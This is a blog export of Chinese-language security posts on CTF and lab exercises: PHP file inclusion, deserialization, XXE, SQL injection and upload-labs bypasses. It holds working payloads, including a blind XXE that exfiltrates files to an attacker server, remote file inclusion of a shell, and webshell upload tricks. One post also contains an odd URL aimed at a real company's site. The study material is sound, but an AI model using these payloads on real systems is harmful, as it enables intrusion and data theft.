<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[PHP安全]]></title>
    <url>%2F2019%2F11%2F04%2FPHP%E5%AE%89%E5%85%A8%2F</url>
    <content type="text"><![CDATA[文件包含漏洞常见的导致文件包含漏洞的函数如下 1include(),include_once(),require(),require_once(),fopen(),readfile() 当使用 1include(),include_once(),require(),require_once() 包含一个新文件时，该文件作为PHP代码去执行。也就是说如果被包含的是txt文件，图片文件，远程url也会被当做PHP代码去执行 想要利用成功文件包含漏洞应满足 12include()等函数通过动态变量的方式引入需要包含的文件用户能够控制该动态变量 本地文件包含123456&lt;?php $file = $_GET['file']; if(file_exists('./home/bh/'.$file.'.php'))&#123; include './home/bh/'.$file.'.php'; &#125; ?&gt; 有这一段代码 用户能够控制file 如果我传入 1?file = ../info.txt 则这段代码就变成了 1include './home/../info.txt.php'; 但是被包含的文件info.txt.php文件是不存在的 这时候我们可以利用已下几种方法去绕过 1234567%00截断../info.txt%00(需要 magic_quotes_gpc=off，PHP小于5.3.4有效)径长度截断：../info.txt/././././././.[…]/./././././.(php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256) 远程文件包含如果PHP配置选项 allow_url_include为on则可以远程加载文件 实战中不常见(可能怪我太菜 我很少遇到) 123&lt;?php include $_GET['url']; ?&gt; 1?url=https://poc10.cn/shell.php shell.txt内容为&lt;?php phpinfo(); ?&gt;会直接打印出phpinfo 远程文件包含还有一种PHP输入输出流的利用方式，可直接执行POST代码 (php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）) 在ctf中比较常见 目录遍历文件包含漏洞也能读取敏感文件或服务器端脚本的源代码 使用../../的方式返回上层目录这种方式被称为目录遍历 例如有如下代码 1234&lt;?php $file = $_GET['file']; include "$file";?&gt; 这里读取了 网站根目录之外的文件 目录遍历是一种跨越目录读取文件的方法，当PHP没有配置open_basedir时 文件包含漏洞可以访问任意文件。 当设置了open_basedir时 open_basedir作用是在某个特定目录下PHP能打开的文件 这就解决了跨目录读取文件的问题。 变量覆盖漏洞1https://recruit.vip.com/psc/ps/EMPLOYEE/HRMS/c/HRS_HRAM.HRS_APP_SCHJOB.GBL?languageCd=ZHS&amp;amp;LoginUser=VABIABPABOABUABTABLABOABGABIAB&amp;amp;PortalActualURL=https://www.baidu.com;PortalRegistryName=EMPLOYEE&amp;amp;PortalServletURI=https%3a%2f%2frecruit.vip.com%2fpsp%2fps%2f&amp;amp;PortalURI=https%3a%2f%2frecruit.vip.com%2fpsc%2fps%2f&amp;amp;PortalHostNode=HRMS&amp;amp;NoCrumbs=yes&amp;amp;PortalKeyStruct=yes]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化漏洞]]></title>
    <url>%2F2019%2F09%2F19%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[序列化和反序列化的概念序列化就是将一个对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名。反序列化则相反将字符串恢复成对象 对象的序列化利于对象的保存和传输 也可以让多个文件共享对象。 ctf很多题型也都是考察PHP反序列化的相关知识 PHP的序列化序列化函数serialize() 首先我创一个Ctf类 里面写了三个属性 后创建了一个ctfer对象 将Ctf类里的信息进行了改变。如果后面还要用到这个对象，就可以先将这个对象进行实例化。用的时候在反序列化出来就ok了 12345678O:3:"Ctf":3&#123;s:4:"flag";s:13:"flag&#123;abedyui&#125;";s:4:"name";s:7:"Sch0lar";s:3:"age";s:2:"18";&#125;O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示3代表类名字占三个字符 s代表字符串4代表属性名长度flag属性名s:13:"flag&#123;abedyui&#125;" 字符串 属性值长度 属性值 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。 可以再__sleep()方法里可以决定哪些属性被序列化 如果没有__sleep()方法则默认序列化所有属性 上图__sleep()方法使flag age 属性序列化 name并没有被序列化 PHP的反序列化反序列化函数unserialize() 反序列化就是将一个序列化的字符串，还原回去 与 序列化函数类似 unserialize() 会检查是否存在一个 __wakeup()魔术方法 如果存在则会先调用__wakeup()方法 可以再__wakeup()方法中对属性进行初始化或者改变。 反序列化之前重新给flag属性赋值 ctf当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。 把1写成2 达到绕过wakeup()效果]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>CTF</tag>
        <tag>序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF web writeup]]></title>
    <url>%2F2019%2F09%2F11%2FBUUCTF%2F</url>
    <content type="text"><![CDATA[平台web题目质量很高 有以往的一些比赛题目 [HCTF 2018]WarmUp右键查看源代码 发现 &lt;!--source.php--&gt;访问source.php发现源码 题目考察代码审计 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"]; if (! isset($page) || !is_string($page)) &#123; echo "you can't see it"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( //mb_substr() 函数返回字符串的一部分 $page, 0, mb_strpos($page . '?', '?')//查找字符串在另一个字符串中首次出现的位置 ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo "you can't see it"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"; &#125; ?&gt; 第一时间没有去分析源码而是去访问了hint.php得到如下信息 1flag not here, and flag in ffffllllaaaagggg 回头分析源码 首先file必须存在且必须是字符串 之后源码去访问类里面的checkFile方法 重点分析方法里面的内容 核心代码 12345 $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?')); 大致意思就是获取?前面的数据，截断?后面的数据 1$_page = urldecode($page); 进行了一次url解码 所以我们构造payload如下 get会自行解码一次 程序里会自行解码一次所以我们把?进行两次编码 1source.php?file=hint.php%253f/../../../../../../ffffllllaaaagggg 得到flag 1flag&#123;e6a6362a-6c69-402f-b469-63d39794be76&#125; 随便注2019强网杯的一道题目 输入 1inject=1' union select 1,2 --+ 发现 程序使用正则过滤了一些关键字 这里我们可以用堆叠注入 在mysql中前语句闭合分号结束后后面的语句也会被执行 1inject=1';show databases; 可查询出所有数据库 1inject=1';show tables; 查询当前数据库下所有表名 1inject=1';show columns from `1919810931114514`; 有个坑 1234mysql中点引号( ‘ )和反勾号( ` )的区别linux下不区分，windows下区分区别: 单引号( ' )或双引号主要用于对字符串的引用符号 eg：mysql&gt; SELECT 'hello', "hello" ; 反勾号( ` )主要用于数据库、表、索引、列和别名用的引用符是[Esc下面的键] eg:`mysql&gt;SELECT * FROM `table` WHERE `from` = 'abc' ; 这里当做表名 进行查询时需要加反引号 不然会查询不出来 查询出了flag字段名 正则过滤了select 无法查询字段数据。后看了师傅们的wp涨姿势了 题目一开始默认查询words表下的数据 猜测后端sql语句为 1select * from words where id=$inject; 而程序又并未过滤alter 和rename 通过重命名把藏flag的表和列改成默认查询的表和列的名字 这样程序就会读到flag payload: 12345inject=1'alter table `1919810931114514` add `id` int default 1;//因为1919810931114514只有flag字段 没有id字段 所以我们添加一个id字段rename table `words` to words1;rename table `1919810931114514` to words;//程序默认查询words表 所以我们把1919810931114514表名 改成words [SUCTF 2019]CheckInsuctf中的一题 当时没有写出来 出了官方wp后好好研究了一下 一个上传点 我想很多师傅想到的都是用.htaccess吧 然而发现不行。。 后来看了wp涨姿势了 .user.ini文件构成的PHP后门 .user.ini比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法 上传一个.user.ini内容为 因为程序会检测文件头所以要加一个GIF98a 12GIF98aauto_prepend_file = flag.jpg 指定同文件夹下的PHP都会包含flag.jpg 类似于使用了include &#39;flag.jpg&#39; 这时候我们上传一个flag.php 程序还过滤了&lt;? 不能写&lt;?php xxx?&gt;用&lt;script language=&#39;php&#39;&gt;xxx&lt;/script&gt;来绕过 当然内容也可以换成一句话 上传后 显示文件路径和文件列表 发现目录下存在index.php 这时候index.php应该是包含了flag.jpg里的内容 访问即可拿到flag]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XXE漏洞利用]]></title>
    <url>%2F2019%2F09%2F08%2Fxxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%2F</url>
    <content type="text"><![CDATA[什么是XXEXXE就是XML外部实体注入 XXE漏洞发生在应用程序解析XML输入时 如果网站没有禁止外部实体加载，则导致可加载恶意外部文件，任意文件读取 命令执行 探测内网端口等等 XML基础XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 在我们利用XML实体注入时 一般payload会写在DTD里 DTD 可内部声明和外部声明 这篇文章的内容是XXE(外部实体注入) 所以重点说一下外部 恶意引入外部实体方式检测是否存在XXExml是否被解析 1&lt;?xml version=”1.0” encoding=”UTF-8”?&gt; &lt;!DOCTYPE ANY [ &lt;!ENTITY test “test”&gt; ]&gt; &lt;root&gt;&amp;test;&lt;/root&gt; 返回test，进行第二步 检测是否支持外部实体 12345&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;&lt;!DOCTYPE ANYTHING [&lt;!ENTITY % test SYSTEM “http://test/test.xml”&gt;%test;]&gt; 目标服务器是否向我们所设置服务器http://test/test.xml发送请求，如果以上两点都存在的情况下，说明存在XXE漏洞 存在也分为两种情况 回显和无回显 服务器存在回显123&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE linux [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt; 通过URI将请求指向了/etc/passwd文件，并最终成功的为我们返回了文件中的内容 有回显的话 会输出/etc/passwd下的内容。 如果服务器没有回显可以blind xxe 服务器不存在回显不存在回显的情况下我们 可以远程读取文件 被称作 blind xxe漏洞 远程情况下我们需要一个服务器 漏洞网站提交 12345678&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM "file:///C:/1.txt"&gt;&lt;!ENTITY % remote SYSTEM "http://192.168.2.1/evil.xml"&gt;%remote;%all;]&gt;&lt;root&gt;&amp;send;&lt;/root&gt; 本地服务器evil.xml内容为 1&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://192.168.2.1/1.php?file=%file;'&gt;"&gt; 查看自己服务器访问日志 即可拿到数据 利用场景-检测内网端口以下代码将尝试与端口8080通信，根据响应时间/长度，攻击者将可以判断该端口是否已被开启。 1234567&lt;?xml version="1.0" encoding="utf-8"?&gt;&lt;!DOCTYPE XXE [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY XXE SYSTEM "http://127.0.0.1:8080" &gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;XXE;&lt;/name&gt;&lt;/root&gt; 防御XXE12345678910PHP:libxml_disable_entity_loader(true);JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);Python:from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) CTF案例https://www.jarvisoj.com/平台上的一题 平台题目质量很高 没事的时候刷一刷还是很有趣的。 题目提示:请设法获得目标机器/home/ctf/flag.txt中的flag值。 抓包发现 1Content-Type: application/json 我们修改成 1Content-Type: application/xml 经检测存在XXE XXEpayload为 123&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE linux [&lt;!ENTITY xxe SYSTEM "/home/ctf/flag.txt" &gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf中的Python脚本]]></title>
    <url>%2F2019%2F05%2F21%2Fctf%E4%B8%AD%E7%9A%84Python%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[CTF中很多需要Python脚本来解决的题目 以前这类题目看到以后就会放弃。 越来越感觉无力,打不动ctf 代码基础不行 而ctf对代码的要求越来越高 暑假准备闭关好好学习一下了 今天抽时间总结一下 ,也顺便巩固了一下Python。 代码写的炒鸡烂 大佬勿喷呀！！！ 速度要快bugku ctf的一道题目 http://123.206.87.240:8002/web6/ 查看源代码发现 需要post一个margin参数 抓包查看响应头发现flag字段 是一段base64加密的值 手工解密后发现还需要在解码一次 出现明文 flag的在短时间内会不断变化,我们需要两次解密flag字段 在flag密文没变的情况下把明文post提交方可得到flag。 这尼玛要不用Python 就算是单身一百年也没有用吧。 贴上脚本 1234567891011import requestsimport base64url = "http://123.206.87.240:8002/web6/"req = requests.session()headers = req.get(url).headerskey = str(base64.b64decode(headers['flag'])).split(":")[1]flag = base64.b64decode(key)print(flag)data = &#123;"margin":flag&#125;gg = req.post(url,data=data)print(gg.text) web 13ctf论剑场里面的一题 和上题类似 解密Password 之后 POST提交 还是用Python来写一下 代码都差不多就不贴出来咯 动手打一下印象会更深的吧 web 2也是ctf论剑场的一题 上星期做了一下这里的web题把需要用Python脚本解的题目都留在今天进行总结。 公式在不停的变化 需要在没有变化之前快速计算出结果并提交 靠手速的话是不可能的 1234567891011import requestsimport reurl = 'http://123.206.31.85:10002/index.php's = requests.session()req = s.get(url)key = str(re.findall(r'&lt;br/&gt;\s.*?&lt;/p&gt;',req.text))key = eval(key[9:-6])print(key)data = &#123;"result":key&#125;flag = s.post(url=url,data=data)print(flag.text) 运行脚本拿到flag 我怎么感觉这题代码写的好烂呢？ web 20 动态密文。需要在变化之前 把密文通过get传给key 经过测试发现解题脚本是有几率爆出flag的所以我们需要多次尝试 123456789101112import requestsimport refor i in range(10): url = 'http://123.206.31.85:10020/index.php' req = requests.session() res = req.get(url).content.decode("utf-8") print(res) encode = re.findall(r'(\w&#123;33&#125;)',res)[0] print(encode) params = &#123;'key':encode&#125; flag = req.get(url=url,params=params) print(flag.content.decode("utf-8")) 天下武功唯快不破来自实验吧的题目与上面第一题非常相似又比第一题简单 123456789import requestsimport base64url = 'http://ctf5.shiyanbar.com/web/10/10.php'flag = str(base64.b64decode(requests.get(url).headers['flag'])).split(':')[1]flag = flag[:-1]print(flag)data = &#123;'key':flag&#125;key = requests.post(url=url,data=data)print(key.content) 第一题写了注释所以这里就不写了 都是一个道理呀！！ 秋名山老司机题目要求两秒钟之内计算出表达式的值 计算出来后通过通过post提交给value参数后可拿到flag 1234567891011import requestsimport reurl = 'http://123.206.87.240:8002/qiumingshan/index.php's = requests.session()req = s.get(url).content.decode("utf-8")value = re.search(r'(&lt;div&gt;)(.*)(=)',req)result = eval(value.group(2))print(result)data = &#123;'value':result&#125;flag = s.post(url=url,data=data)print(flag.text) 正则我写的。。。简直不忍直视 换上一个比较正常的正则 1value = re.search(r'(\d+[+\-*])+(\d+)',req) 不了解正则的可以看一下 Python正则表达式 火眼金睛题目链接火眼金睛 文本演示框两秒一更新 需要Python脚本来获取moctf个数后自动提交 总结上面一些都是我自己经常遇到的一些问题 特意来总结一下 另外说一句 搞安全的代码基础一定要过关。老是吃亏在代码功底上面。本人文笔 水平有限 脚本写的确实lj (没错我自己也发现了 手动滑稽) 大佬勿喷]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php代码审计]]></title>
    <url>%2F2019%2F05%2F06%2Fphp%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[extract变量覆盖extract()该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。 1EXTR_SKIP - 如果有冲突，不覆盖已有的变量。 具体可以参考w3chttp://www.w3school.com.cn/php/func_array_extract.asp 实例这里拿项目里的关于变量覆盖的题来看一下 123456789101112131415161718&lt;?php$flag='xxx'; extract($_GET); if(isset($shiyan)) &#123; $content=trim(file_get_contents($flag)); if($shiyan==$content) &#123; echo'ctf&#123;xxx&#125;'; &#125; else &#123; echo'Oh.no'; &#125; &#125;?&gt; payload 1http://127.0.0.1/php_bugs/01 extract变量覆盖.php?shiyan=&amp;flag= URL 通过 get 的方式传参，传输的数据以数组的形式被封装在\$_GET 中；extract()函数从数组中将变量导入到当前的符号表，该函数使用数组键名作为变量名，使用数组键值作为变量值；isset()函数判断是否存在变量$shiyan;trim()函数移除字符串两侧的空白字符或其他预定义字符 ，这里是移除字符串两侧的空格；file_get_contents()函数将整个文件读入一个字符串；假如$shiyan的值等于文件的内容($content)时，就打印出flag 南邮ctf平台也有一道关于变量覆盖的题 与上题不同的是这题以post方式提交]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式]]></title>
    <url>%2F2019%2F05%2F04%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[如何把一个字符串的特征或规则告诉给计算机，让计算机知道你要描述的东西。被称为正则。 了解正则表达式正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。在很多文本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。 如何把一个字符串的特征或规则告诉给计算机，让计算机知道你要描述的东西。被称为正则。 re模块操作Python当中提供正则表达式的基本模块 模块当中提供了一些关于正则的方法 11、re.match(正则表达式,要匹配的字符串) 若字符串匹配正则表达式则match方法返回匹配对象，否则返回None 也可以在Match对象上用group()方法提取出子串来 如下 正则表达式的匹配规则表示字符 字符 功能 . 匹配任意1个字符（除了\n） [ ] 匹配[ ]中列举的字符 \d 匹配数字，即0-9 \D 匹配非数字，即不是数字 \s 匹配空白，即 空格，tab键 \S 匹配非空白 \w 匹配单词字符，即a-z、A-Z、0-9、_ \W 匹配非单词字符 表示数量 字符 功能 * 匹配前一个字符出现0次或者无限次，即可有可无 + 匹配前一个字符出现1次或者无限次，即至少有1次 ? 匹配前一个字符出现1次或者0次，即要么有1次，要么没有 {m} 匹配前一个字符出现m次 {m,} 匹配前一个字符至少出现m次 {m,n} 匹配前一个字符出现从m到n次 表示边界 字符 功能 ^ 匹配字符串开头 $ 匹配字符串结尾 \b 匹配一个单词的边界 \B 匹配非单词边界 匹配分组 字符 功能 \ \ 匹配左右任意一个表达式 (ab) 将括号中字符作为一个分组 \num 引用分组num匹配到的字符串 (?P&lt;name&gt;) 分组起别名 (?P=name) 引用别名为name分组匹配到的字符串 更精准匹配要做更精确地匹配，可以用[]表示范围 比如匹配手机号 在大陆手机号的第一位都是1 而第二位貌似只能是 3,4,5,7,8 那么要做到更精准我们可以这样写 上面有/d /D 大写表示取反的作用那[]也是可以取反的 前面加一个^就表示对括号里面的取反 小练习:匹配手机号的正则表达式123&gt;&gt;&gt; import re&gt;&gt;&gt; re.match("^1[35678]\d&#123;9&#125;$","18711111111")&lt;re.Match object; span=(0, 11), match='18711111111'&gt; 原始字符串这块我最开始也是比较懵的 可能有点难理解 Python中字符串前面加上 r 表示原生字符串， 与大多数编程语言相同，正则表达式里使用&quot;\&quot;作为转义字符，这就可能造成反斜杠困扰。假如你需要匹配文本中的字符”\“，那么使用编程语言表示的正则表达式里将需要4个反斜杠”\“：前两个和后两个分别用于在编程语言里转义成反斜杠，转换成两个反斜杠后再在正则表达式里转义成一个反斜杠。 像用&#39;\\\\&#39;来匹配\的处理办法看上去太丑陋了。为了简化理解和操作，Python提供了原始字符串 &#39;\\\\&#39;在正则匹配函数中先被理解为&#39;\\&#39;，而&#39;\\&#39;用来匹配待处理字符串，则再一次被理解为用\来匹配字符串。 实际案例匹配出0-100之间的数字1234567&gt;&gt;&gt; import re&gt;&gt;&gt; re.match(r"[1-9]?\d?$|100$","0")&lt;re.Match object; span=(0, 1), match='0'&gt;&gt;&gt;&gt; re.match(r"[1-9]?\d?$|100$","100")&lt;re.Match object; span=(0, 3), match='100'&gt;&gt;&gt;&gt; re.match(r"[1-9]?\d?$|100$","52")&lt;re.Match object; span=(0, 2), match='52'&gt; 分组提取12345&gt;&gt;&gt; result = re.match(r"&lt;h1&gt;(.*)&lt;/h1&gt;","&lt;h1&gt;匹配分组&lt;/h1&gt;")&gt;&gt;&gt; result.group()'&lt;h1&gt;匹配分组&lt;/h1&gt;'&gt;&gt;&gt; result.group(1)'匹配分组' 正则表达式中出现了一个括号 所以group(1)会提取出第一个括号里的内容 1234567&gt;&gt;&gt; result = re.match(r"(&lt;h1&gt;)(.*)(&lt;/h1&gt;)","&lt;h1&gt;匹配分组&lt;/h1&gt;")&gt;&gt;&gt; result.group(1)'&lt;h1&gt;'&gt;&gt;&gt; result.group(3)'&lt;/h1&gt;'&gt;&gt;&gt; result.group(0)'&lt;h1&gt;匹配分组&lt;/h1&gt;' group(0) 会提取出整个内容 分组进阶提取我们都知道html标签都是会成对出现的 那么我们应该写一个可以成对匹配的正则表达式 12345&gt;&gt;&gt; s = "&lt;html&gt;&lt;h1&gt;itcast&lt;/h1&gt;&lt;/html&gt;"&gt;&gt;&gt; re.match(r"&lt;(.+)&gt;&lt;(.+)&gt;.+&lt;/\2&gt;&lt;/\1&gt;",s)// \1表示第一个分组 \2表示第二个分组&lt;re.Match object; span=(0, 28), match='&lt;html&gt;&lt;h1&gt;itcast&lt;/h1&gt;&lt;/html&gt;'&gt;&gt;&gt;&gt; s = "&lt;html&gt;&lt;h1&gt;itcast&lt;/h2&gt;&lt;/script&gt;"&gt;&gt;&gt; re.match(r"&lt;(.+)&gt;&lt;(.+)&gt;.+&lt;/\2&gt;&lt;/\1&gt;",s) 橙色框的案例 前后标签不同所以无法匹配 看起来这样做确实很不错 不过我如果有一万个分组那该怎么办 挨个数然后&lt;/\10000&gt;么 显然不可能 还有一种方法 前面匹配的表里有些写过 给分组命名 1234import reret = re.match(r"&lt;(?P&lt;name1&gt;\w*)&gt;&lt;(?P&lt;name2&gt;\w*)&gt;.*&lt;/(?P=name2)&gt;&lt;/(?P=name1)&gt;", "&lt;html&gt;&lt;h1&gt;www.itcast.cn&lt;/h1&gt;&lt;/html&gt;")ret.group() re模块高级用法re.searchsearch方法与match方法极其类似，区别在于match()函数只检测re是不是在string的开始位置匹配，search()会扫描整个string查找匹配，match（）只有在0位置匹配成功的话才有返回，如果不是开始位置匹配成功的话，match()就返回None。同样，search方法的返回对象同样match()返回对象的方法和属性 这种情况下match就无法匹配 re.findall以列表形式返回全部能匹配的子串 符合匹配以后会继续往下寻找匹配的字符串 re.sub将匹配到的数据进行替换 将标签替换为空 意思是只匹配文字 执行后效果为 re.split根据匹配进行切割字符串，并返回一个列表 12345#split 匹配切割字符串&gt;&gt;&gt;c = "ctf:php,python,web-misc"&gt;&gt;&gt;d = re.split(r":|,|-",c)//用(: , -)为依据 分割字符串&gt;&gt;&gt;print(d)['ctf', 'php', 'python', 'web', 'misc'] 贪婪和非贪婪Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符； 非贪婪则相反，总是尝试匹配尽可能少的字符。 在”*”,”?”,”+”,”{m,n}”后面加上？，使贪婪变成非贪婪。 1234567&gt;&gt;&gt; s="This is a number 234-235-22-423"&gt;&gt;&gt; r=re.match(".+(\d+-\d+-\d+-\d+)",s)&gt;&gt;&gt; r.group(1)'4-235-22-423'&gt;&gt;&gt; r=re.match(".+?(\d+-\d+-\d+-\d+)",s)&gt;&gt;&gt; r.group(1)'234-235-22-423' 正则表达式模式中使用到通配字，那它在从左到右的顺序求值时，会尽量“抓取”满足匹配最长字符串，在我们上面的例子里面，“.+”会从字符串的启始处抓取满足模式的最长字符，其中包括我们想得到的第一个整型字段的中的大部分，“\d+”只需一位字符就可以匹配，所以它匹配了数字“4”，而“.+”则匹配了从字符串起始到这个第一位数字4之前的所有字符。 解决方式：非贪婪操作符“？”，这个操作符可以用在”*”,”+”,”?”的后面，要求正则匹配的越少越好。 小练习1提取图片链接 12345678910e = """&lt;img dataoriginal="https://rpic.douyucdn.cn/appCovers/2016/11/13/1213973_201611131917_small.jpg" src="https://rpic.ucdn.cn/appCovers/2016/11/13/1213973_201611131917_small.jpg" style="display: inline;"&gt;"""f = re.search("http.+?\.jpg",e)print(f.group()) 结果为 1https://rpic.douyucdn.cn/appCovers/2016/11/13/1213973_201611131917_small.jpg 2提取网址1http://www.interoem.com/messageinfo.asp?id=35 正则提取后为 1http://www.interoem.com/ 代码为 123g = "http://www.interoem.com/messageinfo.asp?id=35"h = re.sub("(http://.+?/).*",lambda x:x.group(1),g)print(h)]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Upload-Labs wp]]></title>
    <url>%2F2019%2F04%2F28%2Fup%2F</url>
    <content type="text"><![CDATA[一个上传漏洞总结的很全的靶场 因为最近效率比较低(难听点就是懒) 所以国光哥说 可以一天搞完这些东西然后写篇博客 逼自己一下 本来是应该一天搞完的结果学校停电了没网 真的不是在找借口哈 不过也真的学到了很多新姿势呀。 Pass-01猜测第一关应该比较简单前端验证 创建后缀为jpg的文件 上传 抓包改后缀即可绕过 Pass-02第二题 也是比较常见的 猜测是验证content-type 于是修改content-type为jpg的类型 即可绕过。 Pass-03 上传一个php文件发现 黑名单上传 立即想到的就是大小写混合绕过 试了一下不可以 查看源码发现都被转换成了小写GG了 把后缀改为php3上传成功解析 貌似是apache里面的设置 会把php3当作php去解析 第一次在mac下搭建环境却一直不能成功 还有另一种姿势 上传.htaccess。 Pass-04这就用到了前面说的.htaccess了 因为还是黑名单验证 我们可以上传一个.htaccess上去 内容为 123&lt;FilesMatch ".jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 把.jpg的文件当作php去解析 Pass-05还是黑名单验证 不过呢这里也过滤.htaccess了 但是反过来观察一下 这里却没有进行大小写的转换 PhP直接上传 美滋滋 Pass-06还是黑名单验证 回头看看思维导图 黑名单验证里的空格绕过 这时候源码里并没有过滤空格 所以在.php后添加空格即可绕过 Pass-07黑名单验证 这题最开始有点蒙 看了源码也没想到。。太菜了 偷偷看了网上的wp 忽略了本题没有对后缀进行去.的处理 利用windows的特性会自动去掉后面的. 上传07.php.即可绕过 Pass-08黑名单验证 这次发现了重点 没有去除字符串::$DATA 这种方法实战没用到过 ctf也没用到过 仔细查了一下涨姿势了 必须是windows, 必须是phpphp在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名他的目的就是不检查后缀名…. 上传xx.php::$DATA发现无法找到此文件 windows会去掉::$DATA 直接访问xx.php即可 Pass-09到这里又没了思路。。 思维导图是个好东西。 最常用的陌生后缀解析漏洞都给忘了 我上传一个09.php.xxx apache的特性从右往左依次解析 不认识的后缀会一直往左解析 无法解析xxx就解析成了php。上传成功 Pass-10到了10题以后源码上就没了注释了 这里我自己写一下注释也为了巩固一下php 1234567891011121314151617181920$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");//黑名单 $file_name = trim($_FILES['upload_file']['name']); //移除字符串两侧的空白字符。也就是这里为什么不能空格绕黑名单的原因喽 $file_name = str_ireplace($deny_ext,"", $file_name);//将问题后缀名替换为空 $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 读懂了源码 发现这才是重点 1$file_name = str_ireplace($deny_ext,"", $file_name);//将问题后缀名替换为空 替换为空所以我们双写绕过 Pass-11白名单验证 12$file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file'['name'],".")+1); 先介绍一下函数 1substr(string,start,length)//返回string从start开始的length长度 1strrpos($_FILES['upload_file'['name'],".")//查找.在文件里最后一次出现的位置 回过头来看题 查找文件名中最后一个点后面的后缀 也就是说这行代码就防止了我们 双后缀名绕过 那么该怎么做呢 博客前面写过类似的方法 在路径上11.php后面进行截断后端则会认为11.php 是文件名 真实文件名被截断了所以改成11.jpg进行绕过即可 get会对%00进行自解码所以不用解码 截断条件：php版本小于5.3.4 详情关注CVE-2006-7243php的magic_quotes_gpc为OFF状态 Pass-12与上面题目类似 只不过这题save_path是通过post传输的 post不会像get对%00进行自动解码 所以%00解码 Pass-13 13题与前面都不同 上传图片马 然后利用文件包含漏洞 包含phpinfo dos下命令制作图片马 123456copy 1.jpg /b + 1.php /a 13.jpg参数/b指定以二进制格式复制、合并文件; 用于图像类/声音类文件参数/a指定以ASCII格式复制、合并文件。用于txt等文档类文件copy 1.jpg /b + 1.php /a 13.jpg 